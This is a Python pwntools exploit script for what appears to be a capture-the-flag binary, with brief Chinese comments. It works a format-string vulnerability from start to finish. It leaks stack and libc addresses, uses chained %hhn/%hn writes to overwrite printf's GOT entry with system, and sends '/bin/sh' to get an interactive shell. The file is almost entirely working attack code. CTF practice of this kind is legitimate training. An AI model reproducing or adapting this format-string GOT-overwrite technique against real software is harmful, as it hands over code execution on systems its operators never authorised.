from pwn import *
from LibcSearcher import *
context.terminal=['tmux','splitw','-h']
#context(os='linux', arch='amd64', kernel='amd64',log_level='debug')
context(os='linux', arch='i386', kernel='i386',log_level='debug')
#io=gdb.debug('./pwn','''
#b *0x0804853B
#b *0x08048547
#b *0x08048510
#''')
io=process('./pwn')
libc=ELF('./libc.so.6')
elf=ELF('./pwn')
#io=remote('node4.buuoj.cn',)
s,sl,sa,sla = io.send, io.sendline, io.sendafter, io.sendlineafter
r, ra, rl, ru = io.recv, io.recvall, io.recvline, io.recvuntil
ii=io.interactive
#def lg(name,addr):
#    log.info(f'{name} => {addr}')

def fl():
    ru(b'flag')





def lg(var):
    for name, value in globals().items():
        if value is var:
            log.info(f"{name} => {hex(var)}")
            return





#gdb.attach(io,'''
#b *0x0804853B
#b *0x08048547
#''')

ru(b'=====================')
#泄露栈地址和偏移地址
sl(b'stack%6$pmain%15$p')
ru(b'stack0x')
stack= int(r(8),16)
lg(stack)
ru(b'main0x')
main=int(r(8),16)
lg(main)
libcbase= main-0x1aed5
lg(libcbase)
system=libcbase+libc.sym['system']

print_got=elf.got['printf']
lg(system)
lg(print_got)
stack1=stack-0xc
stack2=stack+4




word=stack1&0xff
payload1=f'%{word}c%6$hhnflag'

payload1=payload1.encode()
sl(payload1)



ru(b'flag')
word=print_got&0xffff

payload2=f'%{word}c%10$hnflag'
payload2=payload2.encode()
sl(payload2)


fl()
word=stack2&0xff
payload3=f'%{word}c%6$hhnflag'
payload3=payload3.encode()
sl(payload3)

fl()

word=(print_got+2)&0xffff

payload4=f'%{word}c%10$hnflag'
payload4=payload4.encode()
sl(payload4)
fl()

#修改栈上got表里的地址
#先改+2的地址里的内容，因为字节少
word1=system>>16&0xff
word2=system&0xffff#-word1
lg(word1)
lg(word2)
word22=word2-word1
lg(word22)
lg(print_got)
lg(system)
payload5=f'%{word1}c%11$hhn%{word22}c%7$hnflag'

payload5=payload5.encode()
sl(payload5)

fl()
sl('/bin/sh')


ii()
